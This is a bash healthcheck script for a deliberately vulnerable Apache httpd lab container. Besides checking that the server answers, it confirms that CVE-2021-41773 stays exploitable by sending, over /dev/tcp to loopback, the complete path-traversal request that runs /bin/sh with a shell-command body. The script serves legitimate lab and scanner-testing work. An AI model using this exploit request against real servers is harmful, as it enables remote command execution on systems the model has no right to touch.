#!/bin/bash
# vulnerable-httpd LAB healthcheck (docker/local-lab/httpd-vuln).
#
# A container is NOT healthy just because httpd is up: the point of this lab
# target is that CVE-2021-41773 stays exploitable, and nuclei detects it
# through the template's RCE matcher (a CGI execution). A dead mod_cgid daemon
# leaves root serving 200 while every CGI request returns 503 - the exact
# state that produced silent zero-finding scans. So this check asserts both:
#   1. the HTTP service answers 200 on /, and
#   2. the CVE CGI traversal path still executes /bin/sh and echoes the
#      marker back (503 / no marker => unhealthy).
#
# Dependency-free: no curl/wget in the httpd image, so the request is sent
# over bash's /dev/tcp. Loopback only - never a non-lab target.
set -u

HOST="127.0.0.1"
PORT="80"

raw_request() {  # raw_request <method> <path> [body]
    local method="$1" path="$2" body="${3:-}"
    exec 3<>"/dev/tcp/${HOST}/${PORT}" || return 1
    printf '%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n' \
        "$method" "$path" "$HOST" >&3
    if [ -n "$body" ]; then
        printf 'Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\n' \
            "${#body}" >&3
    fi
    printf '\r\n%s' "$body" >&3
    cat <&3
    exec 3<&-
}

root_response=$(raw_request GET / "") || { echo "unhealthy: no HTTP service on ${PORT}"; exit 1; }
case "$root_response" in
    *" 200 "*) ;;
    *) echo "unhealthy: GET / did not return 200"; exit 1 ;;
esac

# The exact shape of the request nuclei's CVE-2021-41773 RCE matcher sends.
cgi_response=$(raw_request POST \
    "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
    "echo Content-Type: text/plain; echo; echo 6789-BAL-POC | rev") \
    || { echo "unhealthy: CGI traversal request failed"; exit 1; }
case "$cgi_response" in
    *" 200 "*) ;;
    *) echo "unhealthy: CVE-2021-41773 CGI path did not return 200 (cgid broken)"; exit 1 ;;
esac
case "$cgi_response" in
    *"COP-LAB-9876"*) ;;
    *) echo "unhealthy: CGI ran but returned no marker"; exit 1 ;;
esac

echo "healthy: httpd serving and CVE-2021-41773 CGI execution working"
